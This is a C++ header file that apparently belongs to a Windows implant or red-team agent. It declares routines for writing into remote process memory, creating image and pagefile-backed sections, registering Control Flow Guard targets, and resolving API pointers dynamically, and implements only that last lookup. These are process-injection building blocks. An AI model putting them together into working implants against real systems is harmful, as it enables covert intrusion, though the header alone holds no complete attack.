//
// Created by diago on 2024-05-27.
//

#ifndef MISC_HPP
#define MISC_HPP
#include <Windows.h>
#include <string>
#include <winternl.h>
#include <macro.hpp>
#include <structs.hpp>
#include <function_ptrs.hpp>
#include <vector>

namespace tasking {
    uint32_t    rva_of(HMODULE module_ptr, const std::string& func_name, void** func_address);
    uint32_t    get_entry_point_rva(const std::string& file_buffer);
    uint32_t    get_img_size(char* original_base);
    uint32_t    get_img_raw_size(char* original_base);

    void*       get_img_preferred_base(const std::string& file_buffer);
    void*       get_env_block();
    void        _RtlInitUnicodeString(PUNICODE_STRING UsStruct, PCWSTR Buffer);

    HANDLE      write_into_file(const std::string& buff, const std::string& file_name, uint32_t bytes_to_write, bool delete_on_close);
    HANDLE      create_pagefile_backed_section(uint32_t size, uint32_t protect, NTSTATUS* out_status)   ;
    HANDLE      create_image_section(HANDLE himage, NTSTATUS* out_status);

    bool        create_anonymous_pipe(HANDLE* hread, HANDLE* hwrite);
    bool        is_process_cfg_enforced();
    bool        add_cfg_call_target(char* module_base, void* function_address);
    void*       remote_alloc(HANDLE hprocess, void* preferred, uint32_t size, uint32_t protect);
    bool        remote_write(HANDLE hprocess, void* destination, void* source, size_t size, uint32_t protect_after);
    bool        init_config(const char* pmetadata, implant_context& ctx);
}

namespace tasking {

    template<typename fptr>
    bool get_function_ptr(fptr& out, const std::string& module_name, const std::string& func_name)  {

        fptr ptr = reinterpret_cast<fptr> \
            (GetProcAddress(LoadLibraryA(module_name.c_str()), func_name.c_str()));

        out = ptr;
        return ptr != nullptr;
    }
}

#endif //MISC_HPP
